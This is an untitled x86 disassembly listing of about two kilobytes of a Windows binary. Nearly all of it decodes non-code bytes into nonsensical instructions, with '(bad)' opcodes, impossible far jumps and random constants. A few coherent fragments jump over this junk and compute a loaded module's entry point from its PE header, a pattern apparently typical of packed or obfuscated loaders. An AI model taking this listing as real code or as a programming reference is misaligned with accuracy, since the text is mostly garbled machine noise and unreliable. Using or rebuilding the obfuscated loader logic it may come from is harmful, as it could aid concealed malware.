  41d7ff:	loope  0x41d870
  41d801:	outs   dx,DWORD PTR ds:[esi]
  41d802:	loopne 0x41d7e6
  41d804:	xor    edi,DWORD PTR [edx]
  41d806:	mov    dl,0x1e
  41d808:	or     eax,0x897e3261
  41d80d:	pop    edx
  41d80e:	add    eax,0x5e51f4e8
  41d813:	xor    eax,DWORD PTR [ebx]
  41d815:	rcr    edx,1
  41d817:	and    ecx,esp
  41d819:	add    al,0x5
  41d81b:	push   eax
  41d81c:	pop    es
  41d81d:	shl    DWORD PTR [ecx+edi*1+0x224238a4],cl
  41d824:	dec    ebx
  41d825:	(bad)
  41d828:	out    dx,eax
  41d829:	push   ds
  41d82a:	inc    ecx
  41d82b:	dec    ebp
  41d82c:	test   DWORD PTR [eax+ebx*4+0x25],eax
  41d830:	pop    ecx
  41d831:	inc    ecx
  41d832:	push   ebx
  41d833:	mov    ecx,0xcd3c4e6a
  41d838:	test   al,0x65
  41d83a:	or     al,0x76
  41d83c:	dec    esi
  41d83d:	jecxz  0x41d8a3
  41d83f:	xor    ch,ah
  41d841:	fsub   st(1),st
  41d843:	and    BYTE PTR [eax],0x84
  41d846:	inc    ebp
  41d847:	jmp    0xc139896f
  41d84c:	mov    DWORD PTR [edi+ebx*4],ecx
  41d84f:	sub    eax,0x80673c27
  41d854:	add    al,0xa1
  41d856:	inc    ebx
  41d857:	fld1   
  41d859:	jmp    0x813b:0x12f7
  41d85f:	xchg   edx,eax
  41d860:	pop    ss
  41d861:	mov    eax,0x115152aa
  41d866:	popf   
  41d867:	leave  
  41d868:	jo     0x41d833
  41d86a:	popa   
  41d86b:	mov    ds:0x20f2064a,eax
  41d870:	iret   
  41d871:	lahf   
  41d872:	je     0x41d8dd
  41d874:	loopne 0x41d80a
  41d876:	mov    al,ds:0x195c5c79
  41d87b:	pop    ss
  41d87c:	inc    ecx
  41d87d:	test   eax,0x27a3352e
  41d882:	out    0x41,eax
  41d884:	jge    0x41d86e
  41d886:	lock mov ecx,0x126fa5e5
  41d88c:	ret    
  41d88d:	(bad)  
  41d88e:	aas    
  41d88f:	fild   WORD PTR [eax-0x25]
  41d892:	cmp    al,0x6b
  41d894:	inc    ecx
  41d895:	dec    edi
  41d896:	cmp    ebx,DWORD PTR [edi]
  41d898:	jg     0x41d8bc
  41d89a:	jecxz  0x41d838
  41d89c:	sbb    eax,0x614edbbe
  41d8a1:	(bad)  
  41d8a2:	cmp    BYTE PTR [eax],dl
  41d8a4:	bound  ebx,QWORD PTR [ecx]
  41d8a6:	iret   
  41d8a7:	iret   
  41d8a8:	push   eax
  41d8a9:	pop    ecx
  41d8aa:	xor    DWORD PTR [ebx+0x31],edi
  41d8ad:	das    
  41d8ae:	das    
  41d8af:	in     al,dx
  41d8b0:	add    ebp,DWORD PTR [esi]
  41d8b2:	cmp    esi,DWORD PTR [edi+0x27b85e1e]
  41d8b8:	xor    al,0x53
  41d8ba:	hlt    
  41d8bb:	mov    dh,0x74
  41d8bd:	sbb    eax,0x446dcc8e
  41d8c2:	inc    esp
  41d8c3:	inc    edx
  41d8c4:	xchg   ecx,eax
  41d8c5:	addr16 push ds
  41d8c7:	add    ecx,DWORD PTR [esi]
  41d8c9:	cmp    edx,ebp
  41d8cb:	lahf   
  41d8cc:	mov    cl,0xed
  41d8ce:	xchg   ebx,eax
  41d8cf:	mov    ebx,0xcc41d1c1
  41d8d4:	leave  
  41d8d5:	pop    ss
  41d8d6:	cwde   
  41d8d7:	(bad)
  41d8db:	dec    edi
  41d8dc:	mov    ecx,0x759e1750
  41d8e1:	sub    DWORD PTR ds:0xac771d04,edx
  41d8e7:	ins    DWORD PTR es:[edi],dx
  41d8e8:	ds retf 0xf86a
  41d8ec:	ja     0x41d931
  41d8ee:	jnp    0x41d8e3
  41d8f0:	iret   
  41d8f1:	fnstcw WORD PTR [esi+0x77]
  41d8f4:	mov    ds:0x1501830b,al
  41d8f9:	repz xor ecx,DWORD PTR [edi]
  41d8fc:	loopne 0x41d8fa
  41d8fe:	add    BYTE PTR [ebp-0x64585cea],ch
  41d904:	nop
  41d905:	dec    edi
  41d906:	dec    ebp
  41d907:	mov    esp,0x1824548b
  41d90c:	mov    edi,DWORD PTR [esp+0x1c]
  41d910:	add    eax,edx
  41d912:	adc    ecx,edi
  41d914:	mov    DWORD PTR [esp+0x18],eax
  41d918:	mov    DWORD PTR [esp+0x1c],ecx
  41d91c:	jmp    0x41d926
  41d921:	mov    ebx,0xca79a575
  41d926:	push   0x4
  41d928:	push   0x422558
  41d92d:	jmp    0x41dcfc
  41d932:	mov    cl,0x3a
  41d934:	cdq    
  41d935:	lahf   
  41d936:	bound  ebx,QWORD PTR [edx-0x24cc5e1]
  41d93c:	mov    ds:0xa74c09bc,eax
  41d941:	mov    esp,0x18164d7f
  41d946:	mov    esp,0x1181812
  41d94b:	adc    BYTE PTR [esi-0x1f],dl
  41d94e:	mov    bh,0xf9
  41d950:	dec    edi
  41d951:	ror    DWORD PTR [ebp+0x55],0x6c
  41d955:	in     eax,dx
  41d956:	stc    
  41d957:	int    0x48
  41d959:	mov    DWORD PTR [edx-0x145c47fc],ebp
  41d95f:	pop    ecx
  41d960:	xor    DWORD PTR [esp+esi*2],edx
  41d963:	xchg   edx,eax
  41d964:	sahf   
  41d965:	lods   al,BYTE PTR ds:[esi]
  41d966:	mov    ds:0xa33a1b40,al
  41d96b:	jne    0x41d96c
  41d96d:	mov    ecx,ecx
  41d96f:	test   BYTE PTR [ebx],ch
  41d971:	xor    al,0x18
  41d973:	rcl    DWORD PTR [ebx+edi*8-0x37],cl
  41d977:	test   DWORD PTR [edi+0x44af3584],ebp
  41d97d:	das    
  41d97e:	adc    ebp,edi
  41d980:	xor    al,0xa
  41d982:	out    0x20,eax
  41d984:	jns    0x41d9c2
  41d986:	xor    ch,al
  41d988:	sub    eax,0x2422989e
  41d98d:	add    bh,BYTE PTR [ecx-0x62d3a0cd]
  41d993:	cs mov bh,0x8a
  41d996:	mov    ds:0xf8830a7e,al
  41d99b:	sbb    bh,0x27
  41d99e:	cmp    DWORD PTR [ebp+eax*8-0x4a542f28],ebp
  41d9a5:	cmp    eax,0x28eebdc4
  41d9aa:	test   DWORD PTR [edi-0x43],esp
  41d9ad:	je     0x41d96f
  41d9af:	dec    edx
  41d9b0:	test   esp,ebp
  41d9b2:	jge    0x41d951
  41d9b4:	call   0xd3d9:0x44769d5c
  41d9bb:	jno    0x41d94b
  41d9bd:	adc    ecx,DWORD PTR [esi-0x6e048c25]
  41d9c3:	lds    edx,FWORD PTR [edx+0x74]
  41d9c6:	test   DWORD PTR [ecx+0x52748f1a],esi
  41d9cc:	pop    ebx
  41d9cd:	stos   DWORD PTR es:[edi],eax
  41d9ce:	fmul   DWORD PTR [esi-0x5f]
  41d9d1:	mov    dh,BYTE PTR [ebx-0x43f1d0cf]
  41d9d7:	push   esi
  41d9d8:	adc    eax,0x91ca8046
  41d9dd:	jge    0x41da34
  41d9df:	sub    edx,ecx
  41d9e1:	mov    bl,0x6d
  41d9e3:	or     ecx,DWORD PTR ds:0x37f82a6a
  41d9e9:	pop    edx
  41d9ea:	pop    ds
  41d9eb:	ja     0x41da24
  41d9ed:	cmp    eax,0x11d9bda3
  41d9f2:	mov    al,ds:0xed436145
  41d9f7:	push   eax
  41d9f8:	mov    ebx,0x58613b79
  41d9fd:	and    al,0xa3
  41d9ff:	pop    esi
  41da00:	dec    edi
  41da01:	stc    
  41da02:	add    ecx,DWORD PTR [edx-0x20b4a8b8]
  41da08:	aas    
  41da09:	push   edi
  41da0a:	inc    esp
  41da0b:	in     eax,dx
  41da0c:	rcr    ch,1
  41da0e:	sbb    eax,0x6946946c
  41da13:	test   eax,0x8c9ea236
  41da18:	bnd jp 0x41da51
  41da1b:	mov    dl,0xe1
  41da1d:	mov    al,ds:0xba01c979
  41da22:	fneni(8087 only) 
  41da24:	push   0x1a
  41da26:	inc    esi
  41da27:	or     DWORD PTR [ecx+0x33e70ea4],ebx
  41da2d:	mov    esp,0x58b8535a
  41da32:	adc    eax,0xe40ee3
  41da37:	rcl    DWORD PTR [edx*8+0x50947e89],1
  41da3e:	sbb    DWORD PTR [ebx],0xae536ea9
  41da44:	add    al,0x4a
  41da46:	loop   0x41dac3
  41da48:	aas    
  41da49:	test   ebx,edx
  41da4b:	cmp    al,0x21
  41da4d:	loop   0x41da3d
  41da4f:	lock leave 
  41da51:	sbb    al,0x6
  41da53:	jle    0x41da79
  41da55:	cmp    dl,BYTE PTR ds:0xd61c975a
  41da5b:	in     al,dx
  41da5c:	or     ebx,DWORD PTR [ecx-0x78]
  41da5f:	inc    ebp
  41da60:	push   ebp
  41da61:	push   ecx
  41da62:	aam    0x39
  41da64:	dec    ecx
  41da65:	jg     0x41d9fe
  41da67:	push   ebx
  41da68:	mov    dh,dh
  41da6a:	mov    esp,0x580aa9b2
  41da6f:	lock lods eax,DWORD PTR ds:[esi]
  41da71:	cmc    
  41da72:	xor    DWORD PTR [ebx-0x7d225fb9],edi
  41da78:	or     bl,ch
  41da7a:	push   ss
  41da7b:	inc    ecx
  41da7c:	adc    ch,ah
  41da7e:	icebp  
  41da7f:	sahf   
  41da80:	fld    QWORD PTR [edi-0x2e]
  41da83:	ficomp DWORD PTR ds:[ecx-0x4ed85275]
  41da8b:	pop    ss
  41da8c:	fst    QWORD PTR [edx-0x21]
  41da8f:	pop    ebp
  41da90:	dec    esi
  41da91:	fwait
  41da92:	ret    0x5e0a
  41da95:	sub    bh,dh
  41da97:	call   0xf5a53843
  41da9c:	push   eax
  41da9d:	mov    dl,0x91
  41da9f:	xchg   edx,eax
  41daa0:	inc    esp
  41daa1:	jecxz  0x41db20
  41daa3:	out    0xab,al
  41daa5:	inc    eax
  41daa6:	retf   0xdd3d
  41daa9:	ins    BYTE PTR es:[edi],dx
  41daaa:	or     eax,ebx
  41daac:	fimul  DWORD PTR [edx+0xe804bff]
  41dab2:	jns    0x41da98
  41dab4:	es out dx,eax
  41dab6:	addr16 inc esp
  41dab8:	xchg   ebx,eax
  41dab9:	test   al,0xf8
  41dabb:	inc    edi
  41dabc:	enter  0x5a32,0x45
  41dac0:	mov    ebp,0x8f64b7be
  41dac5:	sub    DWORD PTR [edi-0x185bd1c1],ecx
  41dacb:	popf   
  41dacc:	das    
  41dacd:	adc    eax,0x8598e8ee
  41dad2:	jle    0x41db0a
  41dad4:	jb     0x41dab0
  41dad6:	add    DWORD PTR [ebp-0xb748e8f],0xffffffef
  41dadd:	in     eax,0xd9
  41dadf:	push   0x2f
  41dae1:	jl     0x41dac3
  41dae3:	xchg   ecx,eax
  41dae4:	repnz mov BYTE PTR [esi+0x23],cl
  41dae8:	pop    edx
  41dae9:	push   esi
  41daea:	addr16 ret 
  41daec:	mov    ah,0xe4
  41daee:	cdq    
  41daef:	and    eax,DWORD PTR [ebx]
  41daf1:	popa   
  41daf2:	stc    
  41daf3:	ds push ds
  41daf5:	and    eax,0x58aa4d
  41dafa:	ins    BYTE PTR es:[edi],dx
  41dafb:	or     eax,edi
  41dafd:	lahf   
  41dafe:	mov    ebx,0xc0e08cb7
  41db03:	and    al,0xbd
  41db05:	dec    esi
  41db06:	scas   al,BYTE PTR es:[edi]
  41db07:	xlat   BYTE PTR ds:[ebx]
  41db08:	add    ah,BYTE PTR [edx-0x6c]
  41db0b:	(bad)  
  41db0c:	jp     0x41db51
  41db0e:	push   esp
  41db0f:	mov    ebx,DWORD PTR [esi-0x7e]
  41db12:	push   ebp
  41db13:	(bad)  
  41db14:	iret   
  41db15:	dec    edi
  41db16:	popf   
  41db17:	push   ebx
  41db18:	push   ecx
  41db19:	fs loope 0x41db62
  41db1c:	pop    ecx
  41db1d:	and    eax,0x8e3554fb
  41db22:	push   ebx
  41db23:	dec    edi
  41db24:	dec    esp
  41db25:	ret    0xf47
  41db28:	adc    esi,DWORD PTR ds:0xcc01ae85
  41db2e:	stos   DWORD PTR es:[edi],eax
  41db2f:	aam    0x51
  41db31:	mov    esp,0x9a42ce4e
  41db36:	iret   
  41db37:	std    
  41db38:	mov    bl,0x59
  41db3a:	call   0xc67f:0xba3193e
  41db41:	mov    al,0x77
  41db43:	push   ebp
  41db44:	in     eax,0x1f
  41db46:	mov    edx,0xc4562c3d
  41db4b:	push   eax
  41db4c:	mov    WORD PTR [edx],cs
  41db4e:	fcomi  st,st(5)
  41db50:	xchg   DWORD PTR [ecx-0x450afe0],esi
  41db56:	sbb    BYTE PTR [edx+0x6416cf94],ch
  41db5c:	sti    
  41db5d:	int3   
  41db5e:	add    dh,BYTE PTR [ebx]
  41db60:	jmp    0x41db17
  41db62:	adc    ebx,DWORD PTR [ebp-0x36]
  41db65:	sahf   
  41db66:	daa    
  41db67:	cmp    dh,bh
  41db69:	jge    0x41db3d
  41db6b:	std    
  41db6c:	ffreep st(0)
  41db6e:	cdq    
  41db6f:	adc    DWORD PTR [edx],esi
  41db71:	out    dx,eax
  41db72:	cmp    BYTE PTR [edi+0xd],0x6d
  41db76:	push   cs
  41db77:	mov    BYTE PTR [edx+0x7],ch
  41db7a:	iret   
  41db7b:	pusha  
  41db7c:	or     BYTE PTR ds:0xb1aead57,dl
  41db82:	sub    BYTE PTR [esi+ebp*2+0x53],ch
  41db86:	and    edi,DWORD PTR [edx]
  41db88:	and    eax,0x3567e1b9
  41db8d:	stos   DWORD PTR es:[edi],eax
  41db8e:	xor    eax,0x434fa287
  41db93:	in     eax,dx
  41db94:	es inc esi
  41db96:	xchg   edi,eax
  41db97:	xor    ecx,DWORD PTR [ecx-0x3b]
  41db9a:	icebp  
  41db9b:	mov    cl,0x74
  41db9d:	jmp    0xdb64:0xf609315a
  41dba4:	shl    BYTE PTR [eax+0x2e],1
  41dba7:	and    BYTE PTR ds:0x25ea,0xcf
  41dbad:	pop    ebx
  41dbae:	pushf  
  41dbaf:	mov    ebp,0x7c6bb29c
  41dbb4:	add    DWORD PTR [edx],edx
  41dbb6:	and    ebx,DWORD PTR [edi+0x2bc20510]
  41dbbc:	pop    esi
  41dbbd:	stc    
  41dbbe:	cmp    eax,0x4fcf5689
  41dbc3:	loopne 0x41dbf3
  41dbc5:	or     BYTE PTR [ecx],0x9c
  41dbc8:	lods   al,BYTE PTR ds:[esi]
  41dbc9:	int3   
  41dbca:	jns    0x41db7e
  41dbcc:	adc    al,0xeb
  41dbce:	mov    ah,dl
  41dbd0:	jno    0x41dbf3
  41dbd2:	scas   eax,DWORD PTR es:[edi]
  41dbd3:	mov    bl,0x18
  41dbd5:	mov    bh,BYTE PTR [edi-0x188165fc]
  41dbdb:	and    DWORD PTR [edx+ebx*4+0x78ec26a1],edi
  41dbe2:	mov    dh,0x58
  41dbe4:	inc    sp
  41dbe6:	dec    ebp
  41dbe7:	test   DWORD PTR [edi],esi
  41dbe9:	std    
  41dbea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dbeb:	addr16 inc ecx
  41dbed:	sbb    al,0xf
  41dbef:	jmp    0x105c:0x15ea2ec4
  41dbf6:	inc    edx
  41dbf7:	cmp    ch,BYTE PTR [ebp+0xdaa2663]
  41dbfd:	sbb    DWORD PTR [eax+ecx*1-0x2f0c5d45],esp
  41dc04:	add    DWORD PTR [edx-0x76],edx
  41dc07:	mov    BYTE PTR [esi-0x7b1cfca7],bh
  41dc0d:	adc    BYTE PTR [ebp-0x69],bl
  41dc10:	je     0x41dc36
  41dc12:	jl     0x41dbbd
  41dc14:	(bad)  
  41dc15:	sbb    dh,al
  41dc17:	shr    BYTE PTR [ecx],cl
  41dc19:	mov    esi,0x7aa8d98b
  41dc1e:	nop
  41dc1f:	pop    ecx
  41dc20:	popa   
  41dc21:	pop    es
  41dc22:	adc    DWORD PTR [eax-0x7a],ecx
  41dc25:	push   edi
  41dc26:	in     al,dx
  41dc27:	pop    esi
  41dc28:	sub    dl,BYTE PTR [edx+0x3745f8f4]
  41dc2e:	mov    bh,0x6b
  41dc30:	addr16 lock dec edx
  41dc33:	add    ch,dl
  41dc35:	mov    esp,0x11f8c3b1
  41dc3a:	leave  
  41dc3b:	clc    
  41dc3c:	mov    bh,BYTE PTR [ebx+0x10639a9e]
  41dc42:	and    eax,0x62155cb3
  41dc47:	test   DWORD PTR [edi],edi
  41dc49:	fimul  WORD PTR [ecx+0x772d3c28]
  41dc4f:	pusha  
  41dc50:	ret    0xacc
  41dc53:	adc    edi,DWORD PTR [edi-0x5c]
  41dc56:	aam    0x30
  41dc58:	sbb    DWORD PTR [edx-0x38],ecx
  41dc5b:	out    0x83,eax
  41dc5d:	sub    edx,DWORD PTR [eax+0x3]
  41dc60:	mov    al,ds:0x2b85ce6c
  41dc65:	inc    esi
  41dc66:	adc    al,al
  41dc68:	retf   
  41dc69:	ror    DWORD PTR [esi+esi*8+0x5b],0xe0
  41dc6e:	in     al,dx
  41dc6f:	pop    esp
  41dc70:	pop    es
  41dc71:	imul   edx,DWORD PTR [edx-0x4c],0x1e
  41dc75:	das    
  41dc76:	or     ch,dh
  41dc78:	in     eax,0xf6
  41dc7a:	xor    eax,0x9c9093d7
  41dc7f:	dec    ebx
  41dc80:	pop    edx
  41dc81:	jecxz  0x41dcef
  41dc83:	shr    bl,0xa4
  41dc86:	pop    edx
  41dc87:	xchg   ecx,eax
  41dc88:	mov    eax,ds:0x5e40c740
  41dc8d:	outs   dx,DWORD PTR ds:[esi]
  41dc8e:	or     ebp,DWORD PTR ds:0x4f7040e7
  41dc94:	and    edi,DWORD PTR [si]
  41dc97:	jmp    0x41dc41
  41dc99:	xor    BYTE PTR [edi+0x15],bh
  41dc9c:	pop    ebx
  41dc9d:	fsubr  st,st(1)
  41dc9f:	dec    esi
  41dca0:	inc    ebx
  41dca1:	pop    eax
  41dca2:	mov    WORD PTR [edx],ds
  41dca4:	push   0xdb0726b4
  41dca9:	xlat   BYTE PTR ds:[ebx]
  41dcaa:	xor    ecx,esi
  41dcac:	ror    BYTE PTR [esi+eax*4],cl
  41dcaf:	sub    edi,DWORD PTR [ebp+0x17660a7]
  41dcb5:	test   BYTE PTR [esi+0x3],0x5a
  41dcb9:	fld    DWORD PTR [eax]
  41dcbb:	dec    edx
  41dcbc:	and    ah,0xdc
  41dcbf:	enter  0xf409,0x48
  41dcc3:	rcr    DWORD PTR [ecx],0xb1
  41dcc6:	repnz push ds
  41dcc8:	aam    0xa8
  41dcca:	pop    ebx
  41dccb:	xor    edx,eax
  41dccd:	adc    BYTE PTR [esi-0x21c30733],ah
  41dcd3:	jns    0x41dc98
  41dcd5:	fs inc ebp
  41dcd7:	cmp    edi,DWORD PTR [edx+ecx*2-0x7c]
  41dcdb:	mul    DWORD PTR [eax]
  41dcdd:	repz test eax,0x36920163
  41dce3:	fucom  st(0)
  41dce5:	ja     0x41dd3d
  41dce7:	loopne 0x41dd30
  41dce9:	xor    eax,0xc49ac295
  41dcee:	fild   DWORD PTR [ebp+0x4fda0fc4]
  41dcf4:	not    BYTE PTR [ecx+0x50]
  41dcf7:	sub    al,BYTE PTR [edx+0x69]
  41dcfa:	aad    0x9b
  41dcfc:	lea    eax,[esp+0x6c]
  41dd00:	push   eax
  41dd01:	call   0x415231
  41dd06:	mov    eax,DWORD PTR [esp+0x64]
  41dd0a:	push   0x4
  41dd0c:	push   DWORD PTR [eax+0x1a4]
  41dd12:	lea    eax,[esp+0x74]
  41dd16:	push   eax
  41dd17:	call   0x415231
  41dd1c:	mov    eax,DWORD PTR [esp+0x64]
  41dd20:	mov    eax,DWORD PTR [eax+0x1a4]
  41dd26:	mov    eax,DWORD PTR [eax]
  41dd28:	mov    ecx,DWORD PTR [esp+0x64]
  41dd2c:	mov    eax,DWORD PTR [eax+0x3c]
  41dd2f:	mov    ecx,DWORD PTR [ecx+0x1a4]
  41dd35:	mov    ecx,DWORD PTR [ecx]
  41dd37:	lea    eax,[ecx+eax*1+0x28]
  41dd3b:	mov    eax,DWORD PTR [eax]
  41dd3d:	add    DWORD PTR [esp+0x6c],eax
  41dd41:	mov    DWORD PTR [esp+0x30],0x127
  41dd49:	jmp    0x41e118
  41dd4e:	dec    edi
  41dd4f:	inc    eax
  41dd50:	mov    ds:0x3a6ba279,al
  41dd55:	push   ds
  41dd56:	(bad)  
  41dd57:	push   edx
  41dd59:	push   0x3a
  41dd5b:	push   0x472270cd
  41dd60:	push   ss
  41dd61:	sbb    BYTE PTR [edx+edx*1+0x1ef61818],bh
  41dd68:	fidiv  WORD PTR [eax]
  41dd6a:	inc    esp
  41dd6b:	hlt    
  41dd6c:	and    DWORD PTR [esi],0xffffffe2
  41dd6f:	add    dl,dh
  41dd71:	addr16 pop esi
  41dd73:	and    BYTE PTR [edi+0x6e],0xa8
  41dd77:	cwde   
  41dd78:	sub    ebx,DWORD PTR [eax]
  41dd7a:	std    
  41dd7b:	fwait
  41dd7c:	jno    0x41dd6a
  41dd7e:	xchg   BYTE PTR [ebx+0x50],dl
  41dd81:	aaa    
  41dd82:	adc    al,0x7b
  41dd84:	shl    BYTE PTR [eax+ecx*1+0x7bbef226],1
  41dd8b:	loope  0x41dd80
  41dd8d:	dec    ecx
  41dd8e:	inc    edi
  41dd8f:	ins    DWORD PTR es:[edi],dx
  41dd90:	mov    edi,0x3b5fb7ee
  41dd95:	jbe    0x41dd1e
  41dd97:	pop    ecx
  41dd98:	lods   eax,DWORD PTR ds:[esi]
  41dd99:	fsubr  DWORD PTR [edi]
  41dd9b:	(bad)  
  41dd9c:	scas   eax,DWORD PTR es:[edi]
  41dd9d:	cmp    esp,DWORD PTR [ecx-0x21b37f1d]
  41dda3:	add    ecx,DWORD PTR [ebx-0x4c28f2d5]
  41dda9:	adc    BYTE PTR [ebx-0x765602be],al
  41ddaf:	adc    dh,dh
  41ddb1:	pop    es
  41ddb2:	and    al,0x7a
  41ddb4:	out    0xef,eax
  41ddb6:	xor    al,0xf2
  41ddb8:	jne    0x41de2d
  41ddba:	out    dx,al
  41ddbb:	and    al,BYTE PTR [ebp-0x1a]
  41ddbe:	jne    0x41de24
  41ddc0:	shr    BYTE PTR [edx],cl
  41ddc2:	pop    ds
  41ddc3:	mov    ds:0x5ff20ef8,al
  41ddc8:	dec    edx
  41ddc9:	rcr    DWORD PTR [edx+esi*1-0x16],1
  41ddcd:	mov    ds:0xc92040c0,eax
  41ddd2:	mov    ds:0x3114f438,al
  41ddd7:	(bad)
  41ddda:	sub    BYTE PTR [edx+edx*4],ah
  41dddd:	adc    ebx,DWORD PTR [ebp+0x5dd9ecd6]
  41dde3:	retf   
  41dde4:	enter  0xf78b,0xb3
  41dde8:	mov    al,0x17
  41ddea:	fwait
  41ddeb:	mov    dl,0x52
  41dded:	shr    edi,0xe6
  41ddf0:	sub    eax,0x13c0ba
  41ddf5:	adc    dh,ch
  41ddf7:	inc    esi
  41ddf8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ddf9:	xchg   edx,eax
  41ddfa:	frstor [ebp+0x1b7e32e3]
  41de00:	adc    BYTE PTR [esi+0xb121120],cl
  41de06:	call   0xcdedce09
  41de0b:	scas   al,BYTE PTR es:[edi]
  41de0c:	sub    eax,0xd6222e12
  41de11:	pop    ecx
  41de12:	fsubp  st(4),st
  41de14:	fild   QWORD PTR [ebx-0x5cd4c605]
  41de1a:	sbb    eax,0x4e2a693
  41de1f:	out    dx,al
  41de20:	mov    edi,0xee534c1
  41de25:	dec    ecx
  41de26:	(bad)  
  41de2a:	and    dh,BYTE PTR [ecx+0x7de1ab4e]
  41de30:	jmp    0x3cd257ae
  41de35:	ret    0x5103
  41de38:	imul   esp,edi,0x8cf1de96
  41de3e:	push   0x60
  41de40:	in     al,0xc
  41de42:	(bad)  
  41de43:	cmp    eax,DWORD PTR [esi+0x64]
  41de46:	cli    
  41de47:	outs   dx,DWORD PTR ds:[esi]
  41de48:	jns    0x41de93
  41de4a:	cld    
  41de4b:	daa    
  41de4c:	jecxz  0x41ddd2
  41de4e:	int    0x49
  41de50:	imul   edx,DWORD PTR ds:0x3376ea1d,0xffffffcb
  41de57:	xor    ah,cl
  41de59:	adc    ebp,ebx
  41de5b:	repz inc ebx
  41de5d:	jle    0x41de18
  41de5f:	test   eax,esp
  41de61:	nop
  41de62:	and    dl,al
  41de64:	sti    
  41de65:	mov    esp,0x6bb47a9
  41de6a:	scas   al,BYTE PTR es:[edi]
  41de6b:	xlat   BYTE PTR ds:[ebx]
  41de6c:	mov    al,ds:0x8bea2216
  41de71:	xchg   ebx,eax
  41de72:	or     al,0x18
  41de74:	push   edi
  41de75:	jns    0x41de1a
  41de77:	outs   dx,BYTE PTR ds:[esi]
  41de78:	aad    0x46
  41de7a:	in     al,dx
  41de7b:	loope  0x41debc
  41de7d:	daa    
  41de7e:	pop    eax
  41de7f:	mov    al,ds:0xcc328f38
  41de84:	inc    ecx
  41de85:	dec    eax
  41de86:	mov    esi,0xa15d6547
  41de8b:	mov    DWORD PTR [ebx+0x270c750d],0xc548a39e
  41de95:	aad    0x2
  41de97:	push   0xc03fffe1
  41de9c:	cmp    ch,BYTE PTR [ecx+0x71b4d268]
  41dea2:	leave  
  41dea3:	jns    0x41de50
  41dea5:	aaa    
  41dea6:	and    bh,BYTE PTR [esi+0x52e0b12e]
  41deac:	outs   dx,DWORD PTR ds:[esi]
  41dead:	(bad)  
  41deae:	shl    DWORD PTR [edx+ebx*1+0x294501fb],1
  41deb5:	xchg   edi,eax
  41deb6:	outs   dx,BYTE PTR ds:[esi]
  41deb7:	or     DWORD PTR [edi+0x13],0x53fbe1d
  41debe:	xor    al,0x93
  41dec0:	enter  0x98a6,0xfc
  41dec4:	aam    0xdc
  41dec6:	aas    
  41dec7:	xchg   dh,cl
  41dec9:	aas    
  41deca:	test   dh,ah
  41decc:	sti    
  41decd:	arpl   WORD PTR [ebp+ebp*1-0x27],bp
  41ded1:	push   esi
  41ded2:	xchg   DWORD PTR [ebp+0x2608fb95],edx
  41ded8:	int3   
  41ded9:	mov    eax,ds:0x49cc9ed9
  41dede:	mov    ds:0x88629634,eax
  41dee3:	xchg   bh,ch
  41dee5:	fwait
  41dee6:	nop
  41dee7:	cmp    al,0xad
  41dee9:	sub    al,0x5d
  41deeb:	push   0x2ea81efc
  41def0:	(bad)  
  41def1:	lahf   
  41def2:	xchg   edx,eax
  41def3:	cwde   
  41def4:	xchg   DWORD PTR [edx+0x5d],esp
  41def7:	sbb    BYTE PTR [ebx-0x64],bh
  41defa:	xchg   esi,eax
  41defb:	(bad)  
  41defc:	cmp    ebx,DWORD PTR [ebx]
  41defe:	ret    
  41deff:	imul   ebx,DWORD PTR [ecx],0xe45768a0
  41df05:	push   ds
  41df06:	dec    ebp
  41df07:	xchg   ebx,eax
  41df08:	xchg   DWORD PTR [ebx-0x46],esi
  41df0b:	push   ebp
  41df0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df0d:	xlat   BYTE PTR ds:[ebx]
  41df0e:	dec    ecx
  41df0f:	jo     0x41df55
  41df11:	icebp  
  41df12:	mov    ds,WORD PTR [ebx+0x2256b504]
  41df18:	push   esp
  41df19:	in     eax,dx
  41df1a:	inc    ecx
  41df1b:	xchg   BYTE PTR [ebx-0x26],cl
  41df1e:	inc    ecx
  41df1f:	inc    edx
  41df20:	cmc    
  41df21:	pop    ds
  41df22:	dec    ecx
  41df23:	push   ecx
  41df24:	enter  0xa7d1,0x44
  41df28:	dec    edx
  41df29:	push   ds
  41df2a:	sub    al,0x2e
  41df2c:	(bad)  
  41df2d:	and    al,0xfc
  41df2f:	mov    ebx,0x45af3aea
  41df34:	sbb    eax,0x37153ae8
  41df39:	(bad)  
  41df3a:	xor    al,0x5d
  41df3c:	test   DWORD PTR [eax+edi*1-0x76],ecx
  41df40:	pop    edx
  41df41:	test   eax,0xd8dbc302
  41df46:	imul   DWORD PTR [edx]
  41df48:	ja     0x41dedb
  41df4a:	out    dx,eax
  41df4b:	xchg   DWORD PTR [ecx],eax
  41df4d:	and    esi,edi
  41df4f:	xor    eax,0xa5d2aaa9
  41df54:	cmp    eax,0xe683d873
  41df59:	add    esp,DWORD PTR [eax-0x3c]
  41df5c:	arpl   WORD PTR [edi],sp
  41df5e:	push   edi
  41df5f:	dec    esi
  41df60:	and    al,0xe9
  41df62:	adc    DWORD PTR [ebp+0x0],eax
  41df65:	mov    bh,0x7d
  41df67:	popa   
  41df68:	fldenv [eax-0x40d27a8c]
  41df6e:	sbb    ch,BYTE PTR [ebp+0x5c]
  41df71:	mov    ebx,0xd74d7e81
  41df76:	or     esp,DWORD PTR [esi+ecx*1+0x8162569]
  41df7d:	iret   
  41df7e:	mov    eax,ebx
  41df80:	out    0x5e,eax
  41df82:	das    
  41df83:	jmp    0xb834b1f1
  41df88:	pop    edx
  41df89:	int3   
  41df8a:	adc    BYTE PTR [edx],bl
  41df8c:	mov    ecx,0xb6dbd9fe
  41df91:	xchg   esp,eax
  41df92:	push   0xcabb2758
  41df97:	addr16 mov al,0x9a
  41df9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df9b:	push   ss
  41df9c:	and    dh,BYTE PTR [edx]
  41df9e:	in     eax,0x5
  41dfa0:	test   BYTE PTR [edx+0x6a9b01f9],ah
  41dfa6:	leave  
  41dfa7:	sbb    eax,0x963dab97
  41dfac:	loop   0x41df37
  41dfae:	retf   0x686e
  41dfb1:	dec    esi
  41dfb2:	shr    bl,1
  41dfb4:	adc    DWORD PTR [edx+0x58],esp
  41dfb7:	mov    ah,0xf9
  41dfb9:	inc    edx
  41dfba:	push   edx
  41dfbb:	out    dx,al
  41dfbc:	or     edx,DWORD PTR [ecx]
  41dfbe:	or     BYTE PTR [ecx+0x6],ah
  41dfc1:	jmp    0x3b16:0x890b139
  41dfc8:	inc    edi
